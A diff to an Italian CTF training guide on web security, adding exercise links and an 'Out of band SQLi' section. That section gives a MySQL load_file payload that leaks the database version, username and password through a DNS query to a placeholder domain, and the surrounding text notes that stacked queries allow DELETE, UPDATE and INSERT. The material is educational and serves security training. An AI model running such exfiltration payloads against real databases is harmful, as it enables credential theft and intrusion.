@@ -345,6 +345,9 @@ for link in links:
     print(f"writeup link: {link_url}\n")
 ```
 
+*Esercizi: prime 16 a partire da questa: https://ctf.cyberchallenge.it/challenges#challenge-255*
+*In caso non si avesse accesso alla piattaforma CyberChallenge, c'è un'alternativa pubblica qui: https://training.olicyber.it/challenges#challenge-340*
+
 *L'introduzione è molto stringata e più orientata agli esempi in quanto l'argomento può diventare molto grande a seconda di quanto lo si vuole approfondire, e non mi aspetto che dobbiate usare questa libreria molto spesso, ancor meno se si tratta di un utilizzo non superficiale.*
 
 # Capitolo 1.5
@@ -633,7 +636,6 @@ In SQL il modo di scrivere commenti può variare a seconda del DBMS, ma `-- ` (n
 
 *Challenge d'esempio: https://training.olicyber.it/challenges#challenge-48*
 
-
 ### Union-Based SQLi
 Una volta che siamo sicuri della nostra scoperta, possiamo spingerci oltre. La Logic SQLi appena mostrata permette "solo" di ottenere il contenuto della tabella selezionata o bypassare controlli booleani, ma ci sono anche comandi, come `UNION`, che ci permettono di ottenere dati da più tabelle.
 
@@ -832,6 +834,20 @@ while True:
 Nelle injection precedenti, siamo sempre rimasti "coerenti" con la query scelta dal programmatore. Trovando nel codice sempre `SELECT`, non abbiamo fatto altro che esfiltrare dati "allungando" l'istruzione. È pero possibile il `;` per terminare l'istruzione, permettendo così di inserire poi qualsiasi tipo di istruzioni, comprese `DELETE`, `UPDATE` (aggiorna), `INSERT` (crea).
 
 Nel nostro caso sarà utile il caso opposto: potremmo voler chiudere un'`UPDATE` per injectare una `SELECT`, in modo da rubare la flag.
+
+### Out of band SQLi
+Se non è presente alcun output sincrono, ma è permessa l'esecuzione di comandi, possiamo optare per una out-of-band SQLi. In MySQL:
+
+```sql
+SELECT load_file(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT+user),'.', (SELECT+password),'.',example.com\\test.txt'))
+```
+
+manda una query DNS a `database_version.database_user.database_password.example.com`, permettendo al proprietario del dominio di visualizzare versione del database, username e password dell'utente.
+
+
+*Challenge riassuntive, le ultime 4: https://training.olicyber.it/challenges#challenge-356 / https://ctf.cyberchallenge.it/challenges#challenge-13*
+
+*Allenamento: Categoria web 2 di CyberChallenge. Se non si ha accesso, PortSwigger Academy: https://portswigger.net/web-security/all-labs#:~:text=SQL%20injection*
 
 
 ### Remediation e mitigation
